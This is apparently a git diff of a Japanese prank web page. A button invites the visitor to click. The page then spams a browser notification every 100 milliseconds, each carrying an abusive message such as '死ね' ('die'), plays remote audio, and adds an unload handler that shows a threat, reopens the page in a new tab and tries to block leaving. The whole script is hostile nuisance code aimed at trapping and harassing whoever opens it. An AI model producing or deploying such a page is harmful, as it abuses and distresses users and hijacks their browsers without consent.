@@ -26,25 +26,29 @@
 </head>
 <body>
   <button id="startButton">押してみろよwww</button>
-
   <script>
-    const messages = ["死ね", "クソ", "ばーか", "無限", "終わらんぞ", "お前のせい", "覚悟しろ"];
-    const audio = new Audio("https://files.catbox.moe/3yiigv.mp3");
+    const messages=["死ね","クソ","ばーか","無限","終わらんぞ","お前のせい","覚悟しろ"];
+    const audio=new Audio("https://files.catbox.moe/3yiigv.mp3");
     audio.load();
-
-    document.getElementById("startButton").addEventListener("click", async () => {
-      if (Notification.permission !== "granted") {
+    document.getElementById("startButton").addEventListener("click",async()=>{
+      if(Notification.permission!=="granted"){
         await Notification.requestPermission();
       }
-      if (Notification.permission === "granted") {
-        setInterval(() => {
-          const msg = messages[Math.floor(Math.random() * messages.length)];
+      if(Notification.permission==="granted"){
+        setInterval(()=>{
+          const msg=messages[Math.floor(Math.random()*messages.length)];
           new Notification(msg);
-          audio.play().catch(e => console.error(e));
-        }, 100);
-      } else {
+          audio.play().catch(e=>console.error(e));
+        },100);
+      }else{
         alert("通知の許可が必要だよ");
       }
+      window.addEventListener("beforeunload",function(e){
+        alert("逃げれると思うなよ？");
+        window.open(window.location.href,"_blank");
+        e.preventDefault();
+        e.returnValue="";
+      });
     });
   </script>
 </body>
